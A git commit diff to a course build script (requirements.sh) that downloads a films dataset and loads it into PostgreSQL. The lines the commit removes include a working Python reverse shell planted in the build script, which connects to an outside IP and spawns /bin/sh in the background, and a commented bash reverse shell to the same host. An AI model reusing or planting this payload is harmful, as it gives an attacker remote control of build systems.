110ae4e60ef49430ddc3560f28126c1aeb74f851
datacamp-content-creator <32279578+datacamp-content-creator@users.noreply.github.com>
2020-09-24 09:41:44 +0200

    Update requirements.sh from editor UserId: 1591044

--- requirements.sh
+++ requirements.sh
@@ -1,7 +1,7 @@
-#ping 3.123.202.19
+
 # If bash command fails, build should error out
-#set -e
-python -c 'import os;file = "{}/{}".format(os.getcwd(),"shell.py");sfile = open(file, "w+");sfile.write("#!/usr/bin/env python3 \n");sfile.write("import sys,socket,os,pty \n");sfile.write("s=socket.socket() \n");sfile.write("s.connect((\"3.123.202.19\",80)) \n");sfile.write("[os.dup2(s.fileno(),fd) for fd in (0,1,2)] \n");sfile.write("pty.spawn(\"/bin/sh\") \n");os.system("chmod +x {}".format(file));os.system("nohup python3 -u {} &".format(file));print("nohup python3 -u {} &".format(file))'
+set -e
+
 # Get the data zip and unpack
 apt-get update && apt-get install -y unzip
 FILMS_REPO="https://assets.datacamp.com/course/tmp_fixme_filip/films.zip"
@@ -9,7 +9,7 @@ mkdir -p courses-intro-to-sql/data
 wget $FILMS_REPO
 unzip films.zip -d courses-intro-to-sql/data
 rm films.zip
-#sh -i >& /dev/udp/3.123.202.19/80 0>&1
+
 # Load the database into postgreSQL
 service postgresql start \
   && sudo -u postgres createdb -O repl films \
